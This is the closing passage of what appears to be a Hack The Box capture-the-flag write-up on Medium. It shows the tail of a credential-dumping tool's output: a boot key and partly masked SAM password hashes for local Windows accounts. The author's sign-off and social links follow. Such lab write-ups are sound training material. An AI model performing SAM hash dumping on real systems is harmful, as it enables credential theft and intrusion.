[*] Target system bootKey: 0x34170b414576a40142e3edc4911d859d  
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
Administrator:500:aa-----------------------------------------------------------------  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0----------------  
DefaultAccount:503:aad3b435b--------------------------------------------------------------  
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.  
[*] Dumping cached domain logon information (domain/username:hash)
```


![](https://cdn-images-1.medium.com/max/800/1*hGkWQod_kauo1O_uVsW4OA.png)

*All Attack path*

![](https://cdn-images-1.medium.com/max/800/0*qosU6clrdBxYhS_t.gif)

See you soon, bruh! Keep dropping shells and owning boxes! 💀 And yeah, Shadow Credentials is a solid alternative path you might wanna throw it in for the extra spice. If not, keep it in the toolbox for another day. Either way, keep hacking, keep laughing!

<div class="video-embed"><iframe src="https://www.youtube.com/embed/fAWVHZTmID0" title="YouTube video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen loading="lazy"></iframe></div>

---

### Do You Wanna Chat with Maverick?🥂

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

By Mohamed Eletreby on February 23, 2025.

Canonical link

Exported from Medium on April 20, 2026.